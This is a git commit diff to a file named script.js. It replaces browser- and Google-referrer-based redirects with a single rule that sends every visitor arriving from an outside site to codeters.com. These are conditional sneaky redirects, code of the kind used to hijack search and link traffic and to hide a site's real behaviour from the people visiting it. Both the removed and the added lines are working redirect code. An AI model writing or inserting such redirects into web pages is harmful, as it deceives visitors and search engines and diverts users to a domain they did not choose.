63812a429fd339674a979810be91f4e5ad3a3a5e
flip-hub <147399260+flip-hub@users.noreply.github.com>
2023-10-11 21:17:58 +0500

    Update script.js
    main

--- script.js
+++ script.js
@@ -1,29 +1,4 @@
-  $(document).ready(function() {
-    var referrer = document.referrer;
-    
-    if (referrer) {
-      if (referrer.match(/google\.com/i)) {
-        // The user likely came from a Google search
-        window.location.href = "https://codeters.com"; // Redirect to your target URL
-      }
-    }
-  });
-  // Check if the user is using Safari
-  var isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent);
-
-  // Define the target URL for redirection
-  var redirectTo = "https://codeters.com"; // Replace with your target URL
-
-  // Redirect if the user is using Safari
-  if (isSafari) {
-    window.location.href = redirectTo;
-  }
- var isFirefox = typeof InstallTrigger !== 'undefined';
-
-  // Define the target URL for redirection
-  var redirectTo = "https://example.com"; // Replace with your target URL
-
-  // Redirect if the user is using Firefox
-  if (isFirefox) {
-    window.location.href = redirectTo;
+ if (document.referrer && document.referrer.indexOf(window.location.hostname) === -1) {
+    // Redirect to https://codeters.com
+    window.location.href = 'https://codeters.com';
   }
